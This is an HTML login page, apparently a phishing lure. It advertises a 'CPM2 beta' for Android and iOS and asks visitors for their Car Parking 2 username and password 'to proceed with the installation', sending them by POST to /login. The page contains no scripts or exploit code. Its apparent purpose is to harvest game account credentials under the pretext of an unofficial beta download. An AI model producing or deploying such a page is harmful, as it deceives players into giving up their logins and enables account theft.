<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CPM2 Beta Login</title>
    <!-- Importando uma fonte moderna do Google -->
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            position: relative;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: 'Open Sans', sans-serif;
            overflow: hidden;
            background-color: #f0f0f0; /* Cor base caso a imagem demore a carregar */
        }

        /* Camada da imagem de fundo com 30% de transparência (opacity: 0.3) */
        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image: url('image_e21b6f.jpg');
            background-size: cover;
            background-position: center;
            opacity: 0.3;
            z-index: -1;
        }

        .container {
            width: 100%;
            max-width: 800px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding: 20px;
        }

        h1 {
            font-family: 'Montserrat', sans-serif;
            font-size: 3.5rem;
            font-weight: 800;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3); /* Leve sombra para destacar do fundo */
        }

        .text-white { color: #FFFFFF; }
        .text-yellow { color: #FFC107; } /* Amarelo/Laranja do seu design */

        .icon-logo {
            width: 180px;
            height: auto;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            width: 100%;
            max-width: 400px;
            margin-bottom: 40px;
        }

        .input-group {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }

        .input-group label {
            font-family: 'Montserrat', sans-serif;
            font-size: 2rem;
            font-weight: 700;
            color: #000000;
        }

        .input-group input {
            flex: 1;
            padding: 10px 15px;
            font-size: 1.2rem;
            border: 2px solid rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.8);
            outline: none;
            transition: 0.3s;
        }

        .input-group input:focus {
            background: #ffffff;
            border-color: #FFC107;
        }

        /* Botão invisível mas clicável para submeter o formulário usando o Enter */
        button[type="submit"] {
            display: none; 
        }

        .footer-text {
            font-size: 1.1rem;
            color: #222222;
            font-weight: 600;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Título Superior -->
        <h1><span class="text-white">CPM</span><span class="text-yellow">2 beta Android/Ios</span></h1>
        
        <!-- Ícone Central -->
        <img src="image_e21af0.png" alt="CPM2 Icon" class="icon-logo">

        <!-- Formulário -->
        <form action="/login" method="POST">
            <div class="input-group">
                <label for="usuario">login:</label>
                <input type="text" id="usuario" name="usuario" required>
            </div>
            <div class="input-group">
                <label for="senha">senha:</label>
                <input type="password" id="senha" name="senha" required>
            </div>
            <button type="submit">Entrar</button>
        </form>

        <!-- Texto Inferior -->
        <p class="footer-text">Enter your Car Parking 2 account details to proceed with the installation.</p>
    </div>

</body>
</html>
